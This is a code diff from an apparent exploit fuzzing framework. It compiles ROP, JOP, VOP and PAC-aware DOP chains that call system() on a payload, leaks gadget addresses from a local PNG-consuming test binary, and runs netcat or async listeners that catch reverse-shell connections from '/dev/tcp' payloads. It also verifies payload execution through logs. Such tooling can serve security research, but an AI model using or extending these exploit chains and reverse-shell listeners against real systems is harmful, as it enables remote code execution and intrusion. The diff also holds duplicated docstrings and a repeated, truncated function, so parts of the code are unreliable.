-    # Parse gadget addresses from instrumentation
-    analysis["gadget_addresses"] = parse_gadget_addresses(gdb_output)
-
-    return analysis
-
-def lookup_gadgets(arch: str) -> List[Dict[str, Union[str, bytes]]]:
+def lookup_gadgets(arch: str) -> List[Dict[str, str]]:
+    """Look up ROP/JOP gadgets for the specified architecture.
+    
+    Args:
+        arch: Target architecture ('aarch64' or 'x86_64').
+    
+    Returns:
+        List of gadget dictionaries, each with 'name' and 'desc' keys.
+    """
     """Returns a list of gadgets for the specified architecture."""
     gadgets = []
     if "aarch64" in arch or "arm" in arch:
@@ -451,15 +897,24 @@ def lookup_gadgets(arch: str) -> List[Dict[str, Union[str, bytes]]]:
             # Vector-Oriented Programming (VOP) / Data-Oriented Programming (DOP) gadgets
             {"name": "gadget_vop_fmov", "desc": "FMOV d0, x1; STR d0, [x0]; ret (VOP arbitrary write)"},
             {"name": "gadget_vop_ldr_str", "desc": "LDR q0, [x1]; STR q0, [x0]; ret (VOP/DOP memory-to-memory copy)"},
+            #{"name": "gadget_vop_aur", "desc": "AUR x0, x1; ret (VOP arbitrary register read)"},
+            #{"name": "gadget_vop_aurp", "desc": "AURP x0, x1; ret (VOP arbitrary register read with pointer authentication)"}, 
+            #vop-mov-mov-ldr-str gadgets would also be added here if available 
+            #
+
+
         
         ]
     return gadgets
 
 
 def detect_pac_enabled() -> bool:
-    """
-    Detects if Pointer Authentication is enabled on AArch64.
-    Checks /proc/cpuinfo for 'pac' feature.
+    """Detect if Pointer Authentication (PAC) is enabled on AArch64.
+    
+    Checks /proc/cpuinfo for 'pac' feature flag.
+    
+    Returns:
+        True if PAC is detected as enabled, False otherwise.
     """
     try:
         with open('/proc/cpuinfo', 'r') as f:
@@ -475,7 +930,19 @@ def detect_pac_enabled() -> bool:
     return False
 
 def compile_rop_chain(arch: str, gadgets: List[Dict], payload_addr: int,
-                      leaks: Dict = None, chain_base_addr: Optional[int] = None) -> bytes:
+                      leaks: Optional[Dict] = None, chain_base_addr: Optional[int] = None) -> bytes:
+    """Compile a standard ROP chain to call system(payload_addr).
+    
+    Args:
+        arch: Target architecture ('aarch64' or 'x86_64').
+        gadgets: List of available gadgets (from lookup_gadgets).
+        payload_addr: Memory address of the payload to execute.
+        leaks: Optional dictionary of leaked function/gadget addresses.
+        chain_base_addr: Optional base address for the ROP chain.
+    
+    Returns:
+        Binary ROP chain as bytes, or empty bytes if chain cannot be compiled.
+    """
     """
     Compiles a standard ROP chain to call system(payload_addr).
     
@@ -515,7 +982,19 @@ def compile_rop_chain(arch: str, gadgets: List[Dict], payload_addr: int,
 
 
 def compile_jop_chain(arch: str, gadgets: List[Dict], payload_addr: int,
-                      leaks: Dict = None, chain_base_addr: Optional[int] = None) -> bytes:
+                      leaks: Optional[Dict] = None, chain_base_addr: Optional[int] = None) -> bytes:
+    """Compile a JOP (Jump Oriented Programming) chain.
+    
+    Args:
+        arch: Target architecture ('aarch64' or 'x86_64').
+        gadgets: List of available gadgets (from lookup_gadgets).
+        payload_addr: Memory address of the payload to execute.
+        leaks: Optional dictionary of leaked function/gadget addresses.
+        chain_base_addr: Optional base address for the JOP chain.
+    
+    Returns:
+        Binary JOP chain as bytes, or empty bytes if chain cannot be compiled.
+    """
     """
     Compiles a JOP (Jump Oriented Programming) chain.
     
@@ -581,8 +1060,21 @@ def compile_jop_chain(arch: str, gadgets: List[Dict], payload_addr: int,
     return jop_chain
 
 def compile_vop_chain(arch: str, gadgets: List[Dict], payload_addr: int,
-                      leaks: Dict = None, chain_base_addr: Optional[int] = None,
+                      leaks: Optional[Dict] = None, chain_base_addr: Optional[int] = None,
                       pac_enabled: bool = False) -> bytes:
+    """Compile a VOP (Vector-Oriented Programming) chain for AArch64.
+    
+    Args:
+        arch: Target architecture ('aarch64' or 'x86_64').
+        gadgets: List of available gadgets (from lookup_gadgets).
+        payload_addr: Memory address of the payload to execute.
+        leaks: Optional dictionary of leaked function/gadget addresses.
+        chain_base_addr: Optional base address for the VOP chain.
+        pac_enabled: Whether Pointer Authentication is enabled.
+    
+    Returns:
+        Binary VOP chain as bytes, or empty bytes if chain cannot be compiled.
+    """
     """
     Compiles a VOP (Vector-Oriented Programming) chain for AArch64.
     
@@ -677,7 +1169,19 @@ def compile_vop_chain(arch: str, gadgets: List[Dict], payload_addr: int,
 
 
 def compile_dop_chain(arch: str, gadgets: List[Dict], payload_addr: int,
-                      leaks: Dict = None, chain_base_addr: Optional[int] = None) -> bytes:
+                      leaks: Optional[Dict] = None, chain_base_addr: Optional[int] = None) -> bytes:
+    """Compile a DOP (Data-Oriented Programming) chain using VOP gadgets.
+    
+    Args:
+        arch: Target architecture ('aarch64' or 'x86_64').
+        gadgets: List of available gadgets (from lookup_gadgets).
+        payload_addr: Memory address of the payload to execute.
+        leaks: Optional dictionary of leaked function/gadget addresses.
+        chain_base_addr: Optional base address for the DOP chain.
+    
+    Returns:
+        Binary DOP chain as bytes, or empty bytes if chain cannot be compiled.
+    """
     """
     Compiles a DOP (Data-Oriented Programming) chain using VOP gadgets.
     
@@ -743,6 +1247,46 @@ def compile_dop_chain(arch: str, gadgets: List[Dict], payload_addr: int,
     return dop_chain
 
 
+def compile_pac_dop_chain(arch: str, gadgets: List[Dict], payload_addr: int,
+                         leaks: Dict = None, chain_base_addr: Optional[int] = None,
+                         pac_enabled: bool = True) -> bytes:
+    """
+    Compiles a PAC-aware DOP chain for AArch64.
+
+    PAC_DOP uses data-oriented programming gadgets with pointer authentication
+    helpers when available, improving success against strong CFI/BTI defenses.
+    """
+    if arch != "aarch64":
+        logger.warning(f"PAC_DOP chain only supported on AArch64, got {arch}")
+        return b""
+
+    leaks = leaks or {}
+    if not pac_enabled or not leaks.get("pac_enabled", False):
+        logger.info("PAC not enabled; falling back to standard DOP chain")
+        return compile_dop_chain(arch, gadgets, payload_addr, leaks, chain_base_addr)
+
+    paciasp = leaks.get("gadget_paciasp", 0) or leaks.get("paciasp", 0)
+    autiasp = leaks.get("gadget_autiasp", 0) or leaks.get("autiasp", 0)
+    dop_chain = compile_dop_chain(arch, gadgets, payload_addr, leaks, chain_base_addr)
+
+    if not dop_chain:
+        return b""
+
+    pac_dop_chain = b""
+    if paciasp:
+        logger.info("Adding PACIASP prologue to PAC_DOP chain")
+        pac_dop_chain += paciasp.to_bytes(8, 'little')
+        pac_dop_chain += b"\x00" * 8
+    if autiasp:
+        logger.info("Adding AUTIASP finishing gadget to PAC_DOP chain")
+        pac_dop_chain += autiasp.to_bytes(8, 'little')
+
+    pac_dop_chain += dop_chain
+    if pac_dop_chain:
+        logger.info(f"Generated PAC_DOP chain ({len(pac_dop_chain)} bytes)")
+    return pac_dop_chain
+
+
 def _extract_gadget_address(output: str, key: str) -> Optional[int]:
     """Extract a gadget address from process output using several tolerant patterns."""
     patterns = [
@@ -773,9 +1317,7 @@ def leak_addresses() -> Dict[str, int]:
     import subprocess
     addresses = {}
     try:
-        # Get the absolute path to png_consumer
-        # Assuming png_consumer is in the current working directory of the main script
-        png_consumer_abs_path = os.path.abspath("./png_consumer")
+        png_consumer_abs_path = ensure_png_consumer_built()
         
         # Run with ASLR disabled for stable addresses during validation
         #proc = subprocess.run(["setarch", platform.machine(), "-R", png_consumer_abs_path], capture_output=True, text=True, timeout=2, cwd=leak_dir) # Run without arguments to get gadget addresses
@@ -848,7 +1390,7 @@ def find_and_update_chunk_crc(content: bytearray, chunk_type_to_find: bytes) -> 
 
 
 def cleanup_defunct_processes():
-    """Clean up any defunct netcat processes to prevent accumulation."""
+    """Clean up defunct listener/viewer processes to prevent accumulation."""
     try:
         import psutil
         current_process = psutil.Process()
@@ -856,9 +1398,10 @@ def cleanup_defunct_processes():
         
         for child in children:
             try:
-                if 'nc' in child.name().lower() or 'netcat' in child.name().lower():
+                child_name = child.name().lower()
+                if any(token in child_name for token in ['nc', 'netcat', 'png_consumer']):
                     if child.status() == psutil.STATUS_ZOMBIE:
-                        logger.info(f"Cleaning up defunct netcat process {child.pid}")
+                        logger.info(f"Cleaning up defunct process {child.pid} ({child_name})")
                         child.wait()  # Reap the zombie
             except (psutil.NoSuchProcess, psutil.AccessDenied):
                 continue
@@ -885,14 +1428,20 @@ def cleanup_defunct_processes():
         logger.debug(f"Error during defunct process cleanup: {e}")
 
 
-def start_netcat_listener(port: int = 24444, log_dir: str = os.path.join("logs", "files", "netcat")) -> tuple[subprocess.Popen, str]:
+def start_netcat_listener(port: int = 24444, log_dir: str = os.path.join("logs", "files", "netcat"), use_async: bool = True) -> Tuple[Union[subprocess.Popen, AsyncServerProcess], str, object]: 
     """
-    Starts a persistent netcat listener before fuzzing.
-    Keeps the listener alive across connections and writes logs into log_dir.
-    Returns (nc_process, nc_output_file).
+    Starts a payload listener server before fuzzing.
     
-    Uses nc (netcat) to listen on a port and log all connections.
-    Falls back to builtin netcat if ncat unavailable.
+    By default, uses an efficient async server with low IPC overhead.
+    Falls back to netcat if async server fails or if use_async=False.
+    
+    Keeps the listener alive across connections and writes logs to log_dir.
+    Returns (server_process, log_file_path, file_handle).
+    
+    Args:
+        port: Port to listen on (default 24444).
+        log_dir: Directory for logs (default logs/files/netcat for backward compatibility).
+        use_async: Use async server (True) or netcat fallback (False).
     """
     try:
         if not os.path.isabs(log_dir):
@@ -900,9 +1449,39 @@ def start_netcat_listener(port: int = 24444, log_dir: str = os.path.join("logs",
         log_dir = os.path.abspath(log_dir)
         os.makedirs(log_dir, exist_ok=True)
         nc_output_file = os.path.join(log_dir, f"netcat_{int(time.time())}.log")
-
-        # Open log file for appending - DO NOT pass to subprocess yet
-        nc_log_fd = os.open(nc_output_file, os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o644)
+        
+        # Try async server first (default)
+        if use_async:
+            try:
+                logger.info(f"Attempting to start async payload server on port {port}")
+                # Create empty log file
+                with open(nc_output_file, 'w') as f:
+                    f.write(f"[{time.time()}] Async payload server started\n")
+                
+                # Create and start async server wrapper
+                async_proc = AsyncServerProcess(port=port, log_file=nc_output_file)
+                async_proc.start()
+                
+                # Verify server is running
+                time.sleep(0.2)
+                if async_proc.poll() is not None:
+                    raise RuntimeError("Async server failed to start")
+                
+                # Open log file handle for compatibility
+                log_f = open(nc_output_file, 'a')
+                logger.info(f"✓ Async payload server started successfully on port {port}; logging to {nc_output_file}")
+                return async_proc, nc_output_file, log_f
+            
+            except Exception as e:
+                logger.warning(f"Async server startup failed ({type(e).__name__}: {e}), falling back to netcat listener")
+                # Fall through to netcat fallback
+        
+        # Fallback to netcat
+        logger.info(f"Starting netcat listener on port {port}")
+        
+        # Open log file for appending
+        
+        log_f = open(nc_output_file, 'w')
         
         # Try ncat first (better timeout support), fall back to nc
         ncat_executable = shutil.which("ncat")
@@ -917,27 +1496,22 @@ def start_netcat_listener(port: int = 24444, log_dir: str = os.path.join("logs",
             nc_cmd = [nc_executable, "-l", "-k", "-v", "-p", str(port)]
             logger.info(f"Using nc (netcat) on port {port}")
         else:
-            os.close(nc_log_fd)
-            raise FileNotFoundError("ncat or nc not found in PATH")
-
+            log_f.close()
+            raise FileNotFoundError("Neither ncat nor nc found in PATH; unable to start listener")
+        
         # Set up environment to prevent buffering issues
         env = os.environ.copy()
         env['PYTHONUNBUFFERED'] = '1'
         
-        # Pass file descriptor (not file object) to subprocess
-        # This ensures subprocess owns the fd and can write directly to it
         nc_process = subprocess.Popen(
             nc_cmd,
-            stdout=nc_log_fd,
+            stdout=log_f,
             stderr=subprocess.STDOUT,
-            pass_fds=(nc_log_fd,),
-            env=env
+            env=env,
+            text=True,
+            bufsize=1,  # Line-buffered output 
         )
-        
-        # Close our copy of the fd in parent; subprocess has its own
-        # This is important - we don't want the parent holding a reference
-        os.close(nc_log_fd)
-        
+        log_f.close()
         # Give process a moment to start
         time.sleep(0.2)
         
@@ -947,45 +1521,64 @@ def start_netcat_listener(port: int = 24444, log_dir: str = os.path.join("logs",
         
         logger.info(f"Started netcat listener on port {port}; logging to {nc_output_file}")
         
-        return nc_process, nc_output_file 
+        return nc_process, nc_output_file, log_f
+    
     except Exception as e:
-        logger.error(f"Failed to start netcat listener: {e}")
-        raise
+        logger.error(f"Failed to start payload listener: {e}")
+        raise e
+    finally:
+        # Ensure log file is closed if it was opened
+        try:
+            if 'log_f' in locals() and not log_f.closed:
+                log_f.close()
+        except Exception:
+            pass
+        
+    
 
-def verify_netcat_connection(nc_process: subprocess.Popen, timeout: int = 5) -> bool:
+def verify_netcat_connection(nc_process: Union[subprocess.Popen, AsyncServerProcess], timeout: int = 5) -> bool:
     """
-    Verifies if netcat detected a connection by checking process output.
-    """
+    Verifies if listener detected a connection by checking process output.
+    Works with both async server and netcat processes.
+    """ 
     if not nc_process:
         return False
     
+    # For async server, check if it's running
+    if isinstance(nc_process, AsyncServerProcess):
+        return nc_process.poll() is None
+    
+    # For netcat, check process output
     start_time = time.time()
     while time.time() - start_time < timeout:
         try:
             # Check if process is still running
             if nc_process.poll() is not None:
-                # Process finished, get output
-                stdout, _ = nc_process.communicate(timeout=1)
-                if stdout:
-                    logger.debug(f"Netcat output: {stdout}")
-                    # Check for connection indicators
-                    if any(keyword in stdout.lower() for keyword in ["connect", "connection", "accepted", "session"]):
-                        logger.info("Netcat detected connection!")
-                        return True
-                # If process finished without connection, it timed out (which is ok - means no connection)
+                # Process finished, get output if available
+                if hasattr(nc_process, 'communicate'):
+                    try:
+                        stdout, _ = nc_process.communicate(timeout=1)
+                        if stdout:
+                            logger.debug(f"Netcat output: {stdout}")
+                            # Check for connection indicators
+                            if any(keyword in str(stdout).lower() for keyword in ["connect", "connection", "accepted", "session"]):
+                                logger.info("Netcat detected connection!")
+                                return True
+                    except:
+                        pass
                 return False
             
             # Process still running, wait a bit
             time.sleep(0.2)
         except Exception as e:
-            logger.debug(f"Error checking netcat: {e}")
+            logger.debug(f"Error checking listener: {e}")
             return False
     
     return False
 
-
-def ensure_netcat_listener_state(fuzzer_instance):
-    """Ensure netcat listener exists and is running before fuzzing."""
+MAX_OPEN_FILES = 100000 # Arbitrary high limit to prevent resource exhaustion during fuzzing
+def ensure_netcat_listener_state(fuzzer_instance) -> Tuple[Union[subprocess.Popen, AsyncServerProcess], str, object]:
+    """Ensure payload listener (async or netcat) exists and is running before fuzzing."""
     import psutil
     
     # Clean up any defunct processes first
@@ -993,281 +1586,283 @@ def ensure_netcat_listener_state(fuzzer_instance):
     
     # Check if existing process is still alive and not defunct
     if getattr(fuzzer_instance, 'netcat_process', None):
-        if fuzzer_instance.netcat_process.poll() is None:
-            # Process is still running, check if it's not defunct
+        listener = fuzzer_instance.netcat_process
+        
+        # Check poll status
+        if listener.poll() is None:
+            # Process is still running, check if it's not defunct (skip for async)
+            if isinstance(listener, AsyncServerProcess):
+                return listener, fuzzer_instance.netcat_output_file, getattr(fuzzer_instance, 'netcat_log_f', None)
+            
             try:
-                proc = psutil.Process(fuzzer_instance.netcat_process.pid)
+                proc = psutil.Process(listener.pid)
                 if proc.status() != psutil.STATUS_ZOMBIE:
-                    return fuzzer_instance.netcat_process, fuzzer_instance.netcat_output_file
+                    return listener, fuzzer_instance.netcat_output_file, getattr(fuzzer_instance, 'netcat_log_f', None)
             except (psutil.NoSuchProcess, psutil.AccessDenied):
                 pass
         else:
             # Process has exited, try to clean up
             try:
-                fuzzer_instance.netcat_process.wait(timeout=1)
-            except subprocess.TimeoutExpired:
+                listener.wait(timeout=1)
+            except (subprocess.TimeoutExpired, AttributeError):
                 try:
-                    fuzzer_instance.netcat_process.kill()
+                    listener.kill()
                 except:
                     pass
     
     # Start new listener
-    nc_process, nc_output_file = start_netcat_listener()
+    nc_process, nc_output_file, log_f = start_netcat_listener()
     fuzzer_instance.netcat_process = nc_process
     fuzzer_instance.netcat_output_file = nc_output_file
-    return nc_process, nc_output_file
+    fuzzer_instance.netcat_log_f = log_f
+    return nc_process, nc_output_file, log_f
 #globals for tracking file states across checks in verify_payload_execution
 files_states = {}  # filepath -> (size, mtime, last_check_time)
 file_states_lock = threading.Lock()  # To synchronize access to file_states 
+# ────────────────────────────────────────────────────────────────────────────────
+# New helper functions for fast indicator gathering
+# ────────────────────────────────────────────────────────────────────────────────
 
-def verify_payload_execution(unique_id: str, viewer_name: str, payload: str, timeout: int = 5, nc_process: subprocess.Popen = None, nc_output_file: str = None) -> bool:
-    """
-    Verifies if the payload was executed by checking system logs or netcat connection.
-    
-    - If payload uses /usr/bin/logger (syslog), checks journalctl or /var/log/syslog for unique_id.
-    - If payload uses /dev/tcp, checks netcat output file for unique_id.
-    - If payload writes to a file, checks file for unique_id.
-    
-    Uses proper file locking, fstat monitoring, and write grace periods to prevent race conditions.
-    
-    Args:
-        unique_id: The unique identifier string injected in the payload.
-        viewer_name: Name of the viewer (for logging purposes).
-        payload: The full payload command string.
-        timeout: Time in seconds to wait for verification.
-        nc_process: Optional netcat subprocess for reverse shell verification.
-        nc_output_file: Optional file path where netcat output is redirected.
-    
-    Returns:
-        True if payload execution is confirmed, False otherwise.
-    """
-    import time
-    import subprocess
-    import re
-    import stat
-    
-    logger.info(f"Verifying payload execution for {viewer_name} with unique_id: {unique_id} (payload: {payload})")
-    
-    # Track file states to detect changes
-    #file_states = {}  # filepath -> (size, mtime, last_check_time)
-    global files_states # Use global file_states to maintain state across checks
-    global file_states_lock # Use global lock to synchronize access to file_states
 
-    with file_states_lock:
-        if not files_states:
-            files_states = {}
-            
-    write_grace_period = 0.5  # seconds to wait after file size change before reading
-    
-    start_time = time.time()
-    while time.time() - start_time < timeout:
+def _search_netcat_unique_id(unique_id: str, log_dir: str = "./logs/files/netcat") -> bool:
+    """
+    Search only the most recent netcat log file for *unique_id*.
+    Uses _read_new_lines() to avoid re‑reading the whole file.
+    """
+    if not os.path.isdir(log_dir):
+        return False
+
+    candidates = sorted(
+        [os.path.join(log_dir, f) for f in os.listdir(log_dir)
+         if f.startswith("netcat_") and f.endswith(".log")],
+        key=os.path.getmtime,
+    )
+    if not candidates:
+        return False
+
+    # Only inspect the newest log file
+    file_path = candidates[-1]
+    for line in _read_new_lines(file_path):
+        if unique_id in line:
+            logger.debug(f"Found unique_id in netcat log {file_path}")
+            return True
+    return False
+
+def _search_syslog_unique_id(unique_id: str) -> bool:
+    """
+    Search journalctl first; if that fails, use /var/log/syslog and /var/log/kern.log.
+    In the fallback case we read only the data that has been appended since the last call.
+    """
+    # Prefer journalctl – it already gives us the “new” entries.
+    try:
+        result = subprocess.run(
+            ["journalctl", "--since", "1 minute ago", "--grep", unique_id],
+            capture_output=True, text=True, timeout=5, check=False
+        )
+        if result.returncode == 0 and unique_id in result.stdout:
+            logger.debug("Found unique_id via journalctl")
+            return True
+    except Exception as exc:
+        logger.debug(f"journalctl failed: {exc}")
+
+    # Fallback: read syslog/kern.log incrementally.
+    for log_path in ("/var/log/syslog", "/var/log/kern.log"):
+        if not os.path.exists(log_path):
+            continue
+        for line in _read_new_lines(log_path):
+            if unique_id in line:
+                logger.debug(f"Found unique_id in syslog {log_path}")
+                return True
+    return False
+
+
+def find_unique_in_netcat(unique_id: str, log_dir: str = "./logs/files/netcat") -> bool:
+    """
+    Check the most recent netcat log file for the unique_id.
+    Returns True as soon as the ID is found.
+    """
+    if not os.path.isdir(log_dir):
+        return False
+
+    # Pick the newest log file
+    candidates = sorted(
+        [os.path.join(log_dir, f) for f in os.listdir(log_dir) if f.startswith("netcat_") and f.endswith(".log")],
+        key=os.path.getmtime,
+    )
+    if not candidates:
+        return False
+
+    # Only read the last file
+    file_path = candidates[-1]
+    try:
+        with open(file_path, "r", errors="ignore") as f:
+            for line in f:
+                if unique_id in line:
+                    logger.debug(f"Found unique_id in netcat log {file_path}")
+                    return True
+    except Exception as e:
+        logger.warning(f"Failed to read netcat log {file_path}: {e}")
+    return False
+
+
+def find_unique_in_syslog(unique_id: str) -> bool:
+    """
+    Search system logs using journalctl (or grep fallback) for the unique_id.
+    Returns True if found.
+    """
+    # Prefer journalctl for reliability
+    try:
+        cmd = ["journalctl", "--since", "1 minute ago", "--grep", unique_id]
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5, check=False)
+        if result.returncode == 0 and unique_id in result.stdout:
+            logger.debug("Found unique_id in journalctl output")
+            return True
+    except Exception as e:
+        logger.debug(f"journalctl failed: {e}")
+
+    # Fallback to grep over syslog files
+    for log_path in ("/var/log/syslog", "/var/log/kern.log"):
+        if not os.path.exists(log_path):
+            continue
         try:
-            # Check netcat output file for reverse shell connections
-            # Reverse shell verification: prefer explicit output file, else `logs/files/netcat` directory
-            if "/dev/tcp" in payload:
-                # Sync filesystem to ensure netcat writes are persisted to disk
-                # This is a lightweight operation that ensures all dirty buffers are flushed
-                try:
-                    os.sync()
-                except:
-                    pass
-                
-                checked_files = []
-                if nc_output_file and os.path.exists(nc_output_file):
-                    checked_files.append(nc_output_file)
-
-                if nc_output_file and not os.path.isabs(nc_output_file):
-                    nc_output_file = os.path.join(ROOT_DIR, nc_output_file)
-
-                netcat_log_dir = os.path.join(ROOT_DIR, "logs", "files", "netcat")
-                if os.path.isdir(netcat_log_dir):
-                    for fn in os.listdir(netcat_log_dir):
-                        fpath = os.path.join(netcat_log_dir, fn)
-                        if os.path.isfile(fpath) and fpath not in checked_files:
-                            checked_files.append(fpath)
-
-                if not checked_files and nc_output_file:
-                    checked_files.append(nc_output_file)
-
-                for fpath in checked_files:
-                    if os.path.exists(fpath):
-                        try:
-                            # Get current file stats
-                            current_stat = os.stat(fpath)
-                            current_size = current_stat.st_size
-                            current_mtime = current_stat.st_mtime
-                            current_time = time.time()
-                            
-                            # For netcat files, use longer grace period (2s) to account for buffering delays
-                            nc_grace_period = 1.5  # Longer grace period for netcat output buffering
-                            
-                            # Check if file has changed since last check
-                            prev_state = files_states.get(fpath)
-                            if prev_state:
-                                prev_size, prev_mtime, last_check_time = prev_state
-                                size_changed = current_size != prev_size
-                                mtime_changed = current_mtime != prev_mtime
-                                
-                                # If file changed recently, wait for write grace period
-                                if size_changed or mtime_changed:
-                                    time_since_change = current_time - current_mtime
-                                    if time_since_change < nc_grace_period:
-                                        logger.debug(f"Netcat file {fpath} changed {time_since_change:.2f}s ago, waiting {nc_grace_period}s for grace period")
-                                        time.sleep(nc_grace_period - time_since_change)
-                                        # Re-stat after grace period to detect more changes
-                                        current_stat = os.stat(fpath)
-                                        current_size = current_stat.st_size
-                                        current_mtime = current_stat.st_mtime
-                                        current_time = time.time()
-                            else:
-                                # First time seeing this file, wait a grace period
-                                if current_size > 0:
-                                    logger.debug(f"First check of netcat file {fpath}, waiting {nc_grace_period}s for stabilization")
-                                    time.sleep(nc_grace_period)
-                                    current_stat = os.stat(fpath)
-                                    current_size = current_stat.st_size
-                                    current_mtime = current_stat.st_mtime
-                                    current_time = time.time()
-                            
-                            # Update file state
-                            with file_states_lock:
-                                files_states[fpath] = (current_size, current_mtime, current_time)
-                            
-                            if current_size > 27:  # Only check if file has content (to avoid false positives on empty logs)
-                                logger.debug(f"Checking netcat file {fpath}: size={current_size}, mtime={current_mtime}")
-
-                            # Only check file if it has content
-                            if current_size > 27: #(Listening on 0.0.0.0 24444) + some connection info is typically around 27-30 bytes,
-                                # so check for more than that to ensure we have actual connection data to analyze
-                                # Use file locking to prevent race conditions
-                                with open(fpath, 'r', errors='ignore') as f:
-                                    # Acquire shared lock (non-blocking)
-                                    try:
-                                        fcntl.flock(f.fileno(), fcntl.LOCK_SH | fcntl.LOCK_NB)
-                                        # Force OS to flush file cache to ensure we read latest
-                                        try:
-                                            os.fsync(f.fileno())
-                                        except:
-                                            pass  # fsync may fail on some file systems
-                                        
-                                        nc_output = f.read()
-                                        fcntl.flock(f.fileno(), fcntl.LOCK_UN)  # Release lock
-                                        
-                                        # Log new/changed content for debugging
-                                        if prev_state and (size_changed or mtime_changed):
-                                            logger.debug(f"Netcat file {fpath} NEW contents (last 500 chars): ...{nc_output[-500:]}")
-                                        
-                                        if unique_id in nc_output:
-                                            logger.info(f"PAYLOAD EXECUTION CONFIRMED (reverse shell): Found '{unique_id}' in netcat output file {fpath} for {viewer_name}")
-                                            return True
-                                    except (OSError, BlockingIOError):
-                                        # Lock failed, skip this check to avoid race conditions
-                                        logger.debug(f"Could not acquire lock for {fpath}, skipping check")
-                                        continue
-                            
-                        except Exception as e:
-                            logger.debug(f"Error reading netcat output file {fpath}: {e}")
-
-                    
-                            
-                    
-
-            # Syslog verification for logger-based payloads
-            if "/usr/bin/logger" in payload or "logger" in payload:
-                cmd = ["journalctl", "--since", "1 minute ago", "--grep", unique_id]
-                try:
-                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
-                    if result.returncode == 0 and unique_id in result.stdout:
-                        logger.info(f"PAYLOAD EXECUTION CONFIRMED (syslog): Found '{unique_id}' in system logs for {viewer_name}")
+            with open(log_path, "r", errors="ignore") as f:
+                for line in f:
+                    if unique_id in line:
+                        logger.debug(f"Found unique_id in syslog {log_path}")
                         return True
-                except subprocess.SubprocessError as e:
-                    logger.debug(f"Journalctl check failed: {e}")
-
-                # Fallback: Check /var/log/syslog directly
-                if os.path.exists("/var/log/syslog"):
-                    try:
-                        # Use file locking for syslog too
-                        with open("/var/log/syslog", "r") as f:
-                            try:
-                                fcntl.flock(f.fileno(), fcntl.LOCK_SH | fcntl.LOCK_NB)
-                                if unique_id in f.read():
-                                    fcntl.flock(f.fileno(), fcntl.LOCK_UN)
-                                    logger.info(f"PAYLOAD EXECUTION CONFIRMED (syslog): Found '{unique_id}' in /var/log/syslog for {viewer_name}")
-                                    return True
-                                fcntl.flock(f.fileno(), fcntl.LOCK_UN)
-                            except (OSError, BlockingIOError):
-                                logger.debug("Could not acquire lock for syslog, skipping check")
-                    except Exception as e:
-                        logger.debug(f"Error reading syslog: {e}")
-            
-            # File-based verification for direct file writes
-            file_match = re.search(r'>\s*([^\s]+)', payload)
-            if file_match:
-                file_path = file_match.group(1).strip()
-                if os.path.exists(file_path):
-                    try:
-                        # Get current file stats
-                        current_stat = os.stat(file_path)
-                        current_size = current_stat.st_size
-                        current_mtime = current_stat.st_mtime
-                        current_time = time.time()
-                        
-                        # Check if file has changed since last check
-                        prev_state = files_states.get(file_path)
-                        if prev_state:
-                            prev_size, prev_mtime, last_check_time = prev_state
-                            size_changed = current_size != prev_size
-                            mtime_changed = current_mtime != prev_mtime
-                            
-                            # If file changed recently, wait for write grace period
-                            if size_changed or mtime_changed:
-                                time_since_change = current_time - current_mtime
-                                if time_since_change < write_grace_period:
-                                    logger.debug(f"File {file_path} changed {time_since_change:.2f}s ago, waiting for grace period")
-                                    time.sleep(write_grace_period - time_since_change)
-                                    # Re-stat after grace period
-                                    current_stat = os.stat(file_path)
-                                    current_size = current_stat.st_size
-                                    current_mtime = current_stat.st_mtime
-                                    current_time = time.time()
-                        
-                        # Update file state
-                        file_states[file_path] = (current_size, current_mtime, current_time)
-                        
-                        # Use file locking for payload files too
-                        with open(file_path, "r") as f:
-                            try:
-                                fcntl.flock(f.fileno(), fcntl.LOCK_SH | fcntl.LOCK_NB)
-                                if unique_id in f.read():
-                                    fcntl.flock(f.fileno(), fcntl.LOCK_UN)
-                                    logger.info(f"PAYLOAD EXECUTION CONFIRMED (file): Found '{unique_id}' in {file_path} for {viewer_name}")
-                                    return True
-                                fcntl.flock(f.fileno(), fcntl.LOCK_UN)
-                            except (OSError, BlockingIOError):
-                                logger.debug(f"Could not acquire lock for {file_path}, skipping check")
-                                continue
-                                
-                    except (OSError, UnicodeDecodeError):
-                        # For binary files or permission issues, check modification time
-                        current_stat = os.stat(file_path)
-                        if time.time() - current_stat.st_mtime < timeout:
-                            logger.info(f"PAYLOAD EXECUTION CONFIRMED (file): {file_path} recently modified for {viewer_name}")
-                            return True
-        
-        except subprocess.TimeoutExpired:
-            logger.warning("Verification check timed out, retrying...")
         except Exception as e:
-            logger.error(f"Error during payload verification: {e}")
-        
-        time.sleep(0.2)  # Reduced sleep for more responsive checking
-    
-    # If we reach here, payload execution was NOT confirmed
-    # Check if this might be due to mitigation blocking
-    logger.warning(f"PAYLOAD EXECUTION NOT CONFIRMED: '{unique_id}' not found in logs/files/netcat for {viewer_name} within {timeout}s")
-    
-    # Log as potential mitigation blocking if crash was detected
-    logger.info(f"Payload may have reached execution but been blocked by security mitigations (CFI/BTI)")
-    
+            logger.debug(f"Failed to read syslog {log_path}: {e}")
+    return False
+
+
+LAST_OFFSETS: Dict[str, int] = {}
+def _is_readable_log(file_path: str) -> bool:
+    """
+    Return True only if the file exists, is a regular file, and we have read permission.
+    Skip files that are known to be privileged or extremely large.
+    """
+    privileged = (
+        "boot.log",
+        "wtmp",
+        "utmp",
+        "lastlog",
+        "last",
+        "auth.log",
+        "secure",
+        "kern.log",
+    )
+    if not os.path.isfile(file_path):
+        return False
+    if any(p in os.path.basename(file_path).lower() for p in privileged):
+        return False
+    try:
+        # Try opening for reading; this will raise PermissionError if we cannot.
+        with open(file_path, "rb"):
+            pass
+    except PermissionError:
+        return False
+    except Exception:
+        # Any other error – we ignore the file.
+        return False
+    return True
+def _read_new_lines(file_path: str) -> Iterator[str]:
+    """
+    Yield only the lines that have been appended to *file_path* since the last
+    time this function was called for that file.  The function remembers the
+    last read offset in the global LAST_OFFSETS dictionary.
+    """
+    if not _is_readable_log(file_path):
+        return  # skip unreadable/privileged file
+
+    start = LAST_OFFSETS.get(file_path, 0)
+    try:
+        with open(file_path, "rb") as f:
+            f.seek(start)
+            data = f.read()
+            LAST_OFFSETS[file_path] = f.tell()
+    except Exception:
+        return
+
+    for line in data.decode(errors="ignore").splitlines():
+        yield line
+def _read_new_lines(file_path: str) -> Iterator[str]:
+    """
+    Yield only the lines that have been appended to *file_path* since the last
+    time this function was called for that file.  The function remembers the
+    last read offset in the global LAST_OFFSETS dictionary.
+    """
+    if not _is_readable_log(file_path):
